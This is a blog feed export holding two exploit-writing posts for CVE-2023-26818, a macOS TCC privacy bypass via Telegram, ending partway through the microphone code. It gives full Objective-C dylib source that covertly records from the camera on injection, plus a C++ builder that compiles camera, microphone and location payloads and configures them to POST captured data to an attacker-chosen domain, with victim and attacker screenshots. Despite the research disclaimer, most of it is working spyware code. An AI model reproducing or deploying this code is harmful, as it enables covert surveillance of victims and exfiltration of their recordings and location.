<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:5000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:5000/" rel="alternate" type="text/html" /><updated>2024-02-27T04:39:24+08:00</updated><id>http://localhost:5000/feed.xml</id><title type="html">Zeyad Azima</title><subtitle>Playing Around The Core of the 7 Layers to build the 0day Empire.</subtitle><author><name>Zeyad Azima</name></author><entry><title type="html">Exploit Writing Part 2: CVE-2023-26818 MacOS TCC Bypass W/ telegram</title><link href="http://localhost:5000/macos/CVE_2023_26818_exploit_P2/" rel="alternate" type="text/html" title="Exploit Writing Part 2: CVE-2023-26818 MacOS TCC Bypass W/ telegram" /><published>2023-09-12T00:00:00+08:00</published><updated>2023-09-12T00:00:00+08:00</updated><id>http://localhost:5000/macos/CVE_2023_26818_exploit_P2</id><content type="html" xml:base="http://localhost:5000/macos/CVE_2023_26818_exploit_P2/">&lt;h1 id=&quot;disclaimer&quot;&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;This exploit has been created solely for the purposes of research and for the development of effective defensive techniques.&lt;/p&gt;

&lt;p&gt;It is not intended to be used for any malicious or unauthorized activities. The author and the owner of the script disclaim&lt;/p&gt;

&lt;p&gt;any responsibility or liability for any misuse or damage caused by this software. Users are urged to use this software&lt;/p&gt;

&lt;p&gt;responsibly and only in accordance with applicable laws and regulations. Not for non-ethical usages.&lt;/p&gt;

&lt;h1 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;In this second part, we added more features to the exploits to send the results to a special domain/website in a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;request, So the data can be transferred to the targeted server and retrieved from the server side to the original format.&lt;/p&gt;

&lt;h1 id=&quot;the-exploit&quot;&gt;&lt;strong&gt;The Exploit&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Here we created a console app to make it easier to edit and compile the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dylibs&lt;/code&gt; codes. And let’s break down the codes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string&amp;gt;
#include &amp;lt;cctype&amp;gt;
#include &amp;lt;fstream&amp;gt;
#include &amp;lt;sstream&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;These are the header files that the code needs.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bool isNumber(const std::string&amp;amp; str) {
    for (char const &amp;amp;c : str) {
        if (!std::isdigit(c)) return false;
    }
    return true;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here, checks if a given string is a number by iterating through each character in the string and ensuring it’s a digit. It&lt;/p&gt;

&lt;p&gt;returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt; if the string is a number, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt; otherwise.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void compileAndExport(const std::string &amp;amp;libraryName) {
    std::string compileCommand;
    if (libraryName == &quot;Camera&quot;) {
        compileCommand = &quot;gcc -dynamiclib -framework Foundation -framework AVFoundation ./libs/Camexploit.m -o ./Exports/Cam.dylib&quot;;
    } else if (libraryName == &quot;Microphone&quot;) {
        compileCommand = &quot;gcc -dynamiclib -framework Foundation -framework AVFoundation ./libs/Micexploit.m -o ./Exports/Micexploit.dylib&quot;;
    } else if (libraryName == &quot;Location&quot;) {
        compileCommand = &quot;gcc -dynamiclib -framework Foundation -framework CoreLocation -framework AVFoundation ./libs/Locexploit.m -o ./Exports/Locexploit.dylib&quot;;
    }

    int result = system(compileCommand.c_str());
    if (result == 0) {
        std::cout &amp;lt;&amp;lt; libraryName &amp;lt;&amp;lt; &quot; compilation successful. Exported to ./Exports folder.\n&quot;;
    } else {
        std::cerr &amp;lt;&amp;lt; libraryName &amp;lt;&amp;lt; &quot; compilation failed. Please check the source code.\n&quot;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This function compiles and exports a library based on its name. It prepares a compilation command string based on the&lt;/p&gt;

&lt;p&gt;library’s name and then executes it using the system function. After execution, it checks if the compilation was successful&lt;/p&gt;

&lt;p&gt;and notifies the user accordingly.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void updateFileContent(const std::string&amp;amp; filePath, const std::string&amp;amp; timeInSeconds, const std::string&amp;amp; outputFilename, const std::string&amp;amp; domainName) {
    std::ifstream file(filePath);
    std::ostringstream tempStream;
    std::string line;

    while (std::getline(file, line)) {
        if (line.find(&quot;[NSThread sleepForTimeInterval:&quot;) != std::string::npos) {
            tempStream &amp;lt;&amp;lt; &quot;[NSThread sleepForTimeInterval:&quot; &amp;lt;&amp;lt; timeInSeconds &amp;lt;&amp;lt; &quot;.0];\n&quot;;
        } else if (line.find(&quot;[NSTemporaryDirectory() stringByAppendingPathComponent:@\&quot;file_name\&quot;]&quot;) != std::string::npos) {
            tempStream &amp;lt;&amp;lt; &quot;NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@\&quot;&quot; &amp;lt;&amp;lt; outputFilename &amp;lt;&amp;lt; &quot;\&quot;];\n&quot;;
        } else if (line.find(&quot;[request setURL:[NSURL URLWithString:@\&quot;http://a.com\&quot;]]&quot;) != std::string::npos) {
            tempStream &amp;lt;&amp;lt; &quot;[request setURL:[NSURL URLWithString:@\&quot;&quot; &amp;lt;&amp;lt; domainName &amp;lt;&amp;lt; &quot;\&quot;]];\n&quot;;
        } else {
            tempStream &amp;lt;&amp;lt; line &amp;lt;&amp;lt; &quot;\n&quot;;
        }
    }
    file.close();

    std::ofstream outFile(filePath);
    outFile &amp;lt;&amp;lt; tempStream.str();
    outFile.close();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This function updates the content of a given file (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;specified by filePath&lt;/code&gt;). It reads the file line by line and looks for&lt;/p&gt;

&lt;p&gt;specific placeholders to replace them with user input values (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;time&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filename&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;domain name&lt;/code&gt;). After modifying the&lt;/p&gt;

&lt;p&gt;content, it writes the updated content back to the same file.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main() {
    bool camera = false;
    bool microphone = false;
    bool location = false;
    std::string timeInSeconds;
    std::string outputFilename;
    std::string domainName;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here are flags for each option (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;camera&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;microphone&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;location&lt;/code&gt;) are declared along with strings to store user input for&lt;/p&gt;

&lt;p&gt;recording time, output filename, and domain name.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;while (true) {
        std::cout &amp;lt;&amp;lt; &quot;Select options by entering the number:\n&quot;;
        std::cout &amp;lt;&amp;lt; &quot;1. Toggle Camera (&quot; &amp;lt;&amp;lt; (camera ? &quot;Selected&quot; : &quot;Not Selected&quot;) &amp;lt;&amp;lt; &quot;)\n&quot;;
        std::cout &amp;lt;&amp;lt; &quot;2. Toggle Microphone (&quot; &amp;lt;&amp;lt; (microphone ? &quot;Selected&quot; : &quot;Not Selected&quot;) &amp;lt;&amp;lt; &quot;)\n&quot;;
        std::cout &amp;lt;&amp;lt; &quot;3. Toggle Location (&quot; &amp;lt;&amp;lt; (location ? &quot;Selected&quot; : &quot;Not Selected&quot;) &amp;lt;&amp;lt; &quot;)\n&quot;;
        std::cout &amp;lt;&amp;lt; &quot;4. Set Time In Second for Recording (&quot; &amp;lt;&amp;lt; timeInSeconds &amp;lt;&amp;lt; &quot;)\n&quot;;
        std::cout &amp;lt;&amp;lt; &quot;5. Set Output Filename (&quot; &amp;lt;&amp;lt; outputFilename &amp;lt;&amp;lt; &quot;)\n&quot;;
        std::cout &amp;lt;&amp;lt; &quot;6. Set Domain Name (&quot; &amp;lt;&amp;lt; domainName &amp;lt;&amp;lt; &quot;)\n&quot;;
        std::cout &amp;lt;&amp;lt; &quot;7. Export\n&quot;;
        std::cout &amp;lt;&amp;lt; &quot;8. Exit\n&quot;;
        std::cout &amp;lt;&amp;lt; &quot;&amp;gt; &quot;;

        int choice;
        std::cin &amp;gt;&amp;gt; choice;
        std::cin.ignore(std::numeric_limits&amp;lt;std::streamsize&amp;gt;::max(), '\n'); // clear the buffer

        switch (choice) {
            case 1:
                camera = !camera;
                break;
            case 2:
                microphone = !microphone;
                break;
            case 3:
                location = !location;
                break;
            case 4:
                if (camera || microphone) {
                    std::cout &amp;lt;&amp;lt; &quot;Enter time in seconds: &quot;;
                    std::getline(std::cin, timeInSeconds);
                    if (!isNumber(timeInSeconds)) {
                        std::cout &amp;lt;&amp;lt; &quot;Invalid input! Please enter a valid number for time.\n&quot;;
                        timeInSeconds = &quot;&quot;;
                    }
                } else {
                    std::cout &amp;lt;&amp;lt; &quot;You need to select Camera or Microphone first!\n&quot;;
                }
                break;
            case 5:
                if (camera || microphone) {
                    std::cout &amp;lt;&amp;lt; &quot;Enter output filename: &quot;;
                    std::getline(std::cin, outputFilename);
                } else {
                    std::cout &amp;lt;&amp;lt; &quot;You need to select Camera or Microphone first!\n&quot;;
                }
                break;
            case 6:
                std::cout &amp;lt;&amp;lt; &quot;Enter domain name (including http:// or https://): &quot;;
                std::getline(std::cin, domainName);
                break;
            case 7:
                if (!camera &amp;amp;&amp;amp; !microphone &amp;amp;&amp;amp; !location) {
                    std::cout &amp;lt;&amp;lt; &quot;Please select at least one option!\n&quot;;
                } else if ((camera || microphone || location) &amp;amp;&amp;amp; (timeInSeconds.empty() || outputFilename.empty() || domainName.empty())) {
                    std::cout &amp;lt;&amp;lt; &quot;Please fill in all required fields!\n&quot;;
                } else if ( location &amp;amp;&amp;amp; domainName.empty()) {
                    std::cout &amp;lt;&amp;lt; &quot;Please fill in all required fields!\n&quot;;
                } else {
                    if (camera) {
                        updateFileContent(&quot;./libs/Camexploit.m&quot;, timeInSeconds, outputFilename, domainName);
                        compileAndExport(&quot;Camera&quot;);
                    }
                    if (microphone) {
                        updateFileContent(&quot;./libs/Micexploit.m&quot;, timeInSeconds, outputFilename, domainName);
                        compileAndExport(&quot;Microphone&quot;);
                    }
                    if (location) {
                        updateFileContent(&quot;./libs/Locexploit.m&quot;, timeInSeconds, outputFilename, domainName);
                        compileAndExport(&quot;Location&quot;);
                    }
                }
                break;
            case 8:
                return 0;
            default:
                std::cout &amp;lt;&amp;lt; &quot;Invalid choice. Please try again.\n&quot;;
                break;
        }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This loop continues to run until the user chooses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exit&lt;/code&gt; option. Within the loop, the console presents a menu to the user&lt;/p&gt;

&lt;p&gt;to select various options such as toggling which features are selected, setting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recording time&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output filename&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;domain&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exporting&lt;/code&gt;. Depending on the user’s choice, various tasks are performed. and then executes actions based on the&lt;/p&gt;

&lt;p&gt;user’s choice. If the user chooses option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8. Exit&lt;/code&gt; the code will exit, terminating the loop and the process.&lt;/p&gt;

&lt;h1 id=&quot;exploit-test&quot;&gt;&lt;strong&gt;Exploit Test&lt;/strong&gt;&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Victim Side:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/0eeac39881c909bfb4ab3e08d9dd84bb&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Attacker Side:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/bd4f32929210fb6d05b566ca9144aad4&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;As of now we finished the full exploit with the ability to send the data to us on the server after we exploit it, &lt;strong&gt;&lt;em&gt;Disclaimer:&lt;/em&gt;&lt;/strong&gt; This&lt;/p&gt;

&lt;p&gt;exploit has been created solely for the purposes of research and for the development of effective defensive techniques. It is&lt;/p&gt;

&lt;p&gt;not intended to be used for any malicious or unauthorized activities. The author and the owner of the script disclaim any&lt;/p&gt;

&lt;p&gt;responsibility or liability for any misuse or damage caused by this software. Users are urged to use this software responsibly&lt;/p&gt;

&lt;p&gt;and only in accordance with applicable laws and regulations. Not for non-ethical usages.&lt;/p&gt;</content><author><name>Zeyad Azima</name></author><summary type="html">Disclaimer</summary></entry><entry><title type="html">Exploit Writing Part 1: CVE-2023-26818 MacOS TCC Bypass W/ telegram</title><link href="http://localhost:5000/macos/CVE_2023_26818_exploit_P1/" rel="alternate" type="text/html" title="Exploit Writing Part 1: CVE-2023-26818 MacOS TCC Bypass W/ telegram" /><published>2023-09-06T00:00:00+08:00</published><updated>2023-09-06T00:00:00+08:00</updated><id>http://localhost:5000/macos/CVE_2023_26818_exploit_P1</id><content type="html" xml:base="http://localhost:5000/macos/CVE_2023_26818_exploit_P1/">&lt;h1 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;After the 2 parts of analysis for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2023-26818&lt;/code&gt;. Now, It’s the time to write a full exploit for this vulnerability, We&lt;/p&gt;

&lt;p&gt;gonna write a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GUI&lt;/code&gt; based software that create different exploits and each one has a different approach. So this part is part&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, We gonna write and explain each exploit code that approching a different &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlmenet&lt;/code&gt;. If you didn’t read the analysis&lt;/p&gt;

&lt;p&gt;you better back and read it first.&lt;/p&gt;

&lt;h1 id=&quot;overview&quot;&gt;&lt;strong&gt;Overview&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now, Let’s take a look on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telegram&lt;/code&gt; app, So we create an exploit for each one of them:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;codesign -dv --entitlements - /Applications/Telegram.app
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;/assets/images/1185d43e2eb678ae5e5b42802ebca912&quot; alt=&quot;&quot; /&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We can see that we have 3 of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; as the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.security.device.camera&lt;/code&gt;: This entitlement grants the app access to the camera.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.security.device.audio-input&lt;/code&gt;: With this entitlement, the app can access the microphone or any other audio input device.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.apple.security.personal-information.location&lt;/code&gt;: This entitlement allows the app to access location services, meaning it can determine the geographic location of the device.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;the-exploit&quot;&gt;&lt;strong&gt;The Exploit&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now, For each one of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlements&lt;/code&gt; we gonna make it an exploit ( Except the cam it’s already exist ).&lt;/p&gt;

&lt;h2 id=&quot;camera-exploit&quot;&gt;&lt;strong&gt;Camera Exploit&lt;/strong&gt;&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;Foundation/Foundation.h&amp;gt;
#import &amp;lt;AVFoundation/AVFoundation.h&amp;gt;

@interface VideoRecorder : NSObject &amp;lt;AVCaptureFileOutputRecordingDelegate&amp;gt;

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end

@implementation VideoRecorder

- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}

- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    NSError *error;
    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&amp;amp;error];

    if (error) {
        NSLog(@&quot;Error setting up video device input: %@&quot;, [error localizedDescription]);
        return;
    }

    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
        [self.captureSession addInput:self.videoDeviceInput];
    }

    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];

    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
        [self.captureSession addOutput:self.movieFileOutput];
    }
}

- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@&quot;recording.mov&quot;];
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@&quot;Recording started&quot;);
}

- (void)stopRecording {
    [self.movieFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@&quot;Recording stopped&quot;);
}

#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray&amp;lt;AVCaptureConnection *&amp;gt; *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@&quot;Recording failed: %@&quot;, [error localizedDescription]);
    } else {
        NSLog(@&quot;Recording finished successfully. Saved to %@&quot;, outputFileURL.path);
    }
}

@end

__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];

    [videoRecorder startRecording];
    [NSThread sleepForTimeInterval:5.0];
    [videoRecorder stopRecording];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s explain the code by part by part:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;Foundation/Foundation.h&amp;gt;
#import &amp;lt;AVFoundation/AVFoundation.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Foundation&lt;/code&gt; framework provides basic classes and data types, while &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVFoundation&lt;/code&gt; provides classes for working with audio&lt;/p&gt;

&lt;p&gt;and video.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@interface VideoRecorder : NSObject &amp;lt;AVCaptureFileOutputRecordingDelegate&amp;gt;

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This interface declares a class called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VideoRecorder&lt;/code&gt; that conforms to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureFileOutputRecordingDelegate&lt;/code&gt; protocol. It&lt;/p&gt;

&lt;p&gt;defines properties for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureSession&lt;/code&gt; (used to coordinate video capture), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureDeviceInput&lt;/code&gt; (used to represent the&lt;/p&gt;

&lt;p&gt;device’s camera as an input source), and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureMovieFileOutput&lt;/code&gt; (used to write the captured video to a file).&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@implementation VideoRecorder

- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here the initializer for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VideoRecorder&lt;/code&gt; class. When an instance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VideoRecorder&lt;/code&gt; is created, it automatically calls the&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setupCaptureSession&lt;/code&gt; method to set up the video capture session.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    NSError *error;
    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&amp;amp;error];

    if (error) {
        NSLog(@&quot;Error setting up video device input: %@&quot;, [error localizedDescription]);
        return;
    }

    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
        [self.captureSession addInput:self.videoDeviceInput];
    }

    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];

    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
        [self.captureSession addOutput:self.movieFileOutput];
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this method we set up the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureSession&lt;/code&gt; and configures it to use the device’s default video capture device (camera).&lt;/p&gt;

&lt;p&gt;It checks for errors during device input configuration and adds the video device input and movie file output to the capture&lt;/p&gt;

&lt;p&gt;session if possible.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@&quot;recording.mov&quot;];
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@&quot;Recording started&quot;);
}

- (void)stopRecording {
    [self.movieFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@&quot;Recording stopped&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startRecording&lt;/code&gt; method starts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureSession&lt;/code&gt; and begins recording video to a file with the specified output file&lt;/p&gt;

&lt;p&gt;URL. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stopRecording&lt;/code&gt; method stops the recording and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureSession&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray&amp;lt;AVCaptureConnection *&amp;gt; *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@&quot;Recording failed: %@&quot;, [error localizedDescription]);
    } else {
        NSLog(@&quot;Recording finished successfully. Saved to %@&quot;, outputFileURL.path);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This delegate method is called when the recording is finished. It checks for any error and logs the result accordingly.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];

    [videoRecorder startRecording];
    [NSThread sleepForTimeInterval:3.0];
    [videoRecorder stopRecording];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, This function is marked with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__attribute__((constructor))&lt;/code&gt; attribute which makes it a constructor function. It&lt;/p&gt;

&lt;p&gt;is automatically called before the main function of the program starts running and inside it a new instance of the&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VideoRecorder&lt;/code&gt; class is created and then video recording is started and stopped with a 3 seconds delay between the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;start&lt;/code&gt; and&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stop&lt;/code&gt; calls.&lt;/p&gt;

&lt;h2 id=&quot;microphone-exploit&quot;&gt;&lt;strong&gt;Microphone Exploit&lt;/strong&gt;&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;Foundation/Foundation.h&amp;gt;
#import &amp;lt;AVFoundation/AVFoundation.h&amp;gt;

@interface AudioRecorder : NSObject &amp;lt;AVCaptureFileOutputRecordingDelegate&amp;gt;

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;

